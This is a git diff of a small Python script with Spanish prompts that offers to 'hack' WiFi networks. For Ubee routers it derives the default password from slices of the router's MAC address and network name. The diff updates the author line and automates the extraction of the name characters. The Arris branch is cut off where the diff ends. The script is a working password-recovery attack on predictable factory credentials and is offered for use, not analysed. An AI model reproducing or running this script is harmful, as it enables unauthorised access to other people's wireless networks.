@@ -1,4 +1,4 @@
-#beta
+#Emilio Barroso
 botrl = """
 .--..----..---..---. 
 |-< | || |`| |'| |-< 
@@ -7,11 +7,10 @@ botrl = """
 """
 print (botrl)
 print ("BoG - technologies")
-
 otsion = input("Wifi a hackear(1.ubee/2.Arris): ")
 if otsion=="1":
   string = input("Mac(bssid): ")
-  strong = input("Ultimos dos digitos de Red(ssid):")
+  strong = input("Nombre de la Red(ssid):")[6:8]
   macs = string.replace(":","")[2:10]
   print("Password: " + macs + strong)
 elif otsion=="2":
